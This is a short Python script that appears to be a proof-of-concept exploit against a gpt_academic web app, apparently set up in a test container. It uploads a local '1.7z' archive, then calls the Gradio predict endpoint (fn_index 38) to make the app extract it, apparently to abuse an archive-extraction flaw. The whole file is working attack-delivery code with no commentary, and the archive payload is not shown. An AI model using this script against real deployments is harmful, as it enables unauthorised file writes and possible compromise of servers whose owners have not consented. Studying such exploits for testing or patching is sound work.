import requests
import random
import string
import time
import os

def main():
    hostname = "gpt-academic-app"
    port = 12345
    file_path = './1.7z'

    # First upload the file
    print("Attempting file upload...")
    url = f"http://{hostname}:{port}/upload"
    files = {'files': (file_path, open(file_path, 'rb'), 'text/plain')}
    try:
        response = requests.post(url, files=files, timeout=30)
        print(f"Upload response: {response.text}")
        tmp_path = response.json()[0]
    except Exception as e:
        print(f"Upload failed: {str(e)}")
        return

    # Immediate check for success
    print("Sending extraction request...")
    url = f"http://{hostname}:{port}/run/predict"
    headers = {"Content-Type": "application/json"}
    random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
    data = {
        "data": [[{
            "data": f"http://{hostname}:{port}/file="+tmp_path,
            "blob": {"is_file": True, "name": tmp_path, "data": None},
            "name": tmp_path,
            "size": 122,
            "orig_name": "1.7z",
            "is_file": True
        }], [], "", "", ["基础功能区", "函数插件区"], None],
        "event_data": None,
        "fn_index": 38,
        "session_hash": random_string
    }

    try:
        # Send request without waiting for response
        requests.post(url, headers=headers, json=data, timeout=1)
    except requests.exceptions.Timeout:
        pass  # Expected timeout

if __name__ == "__main__":
    main()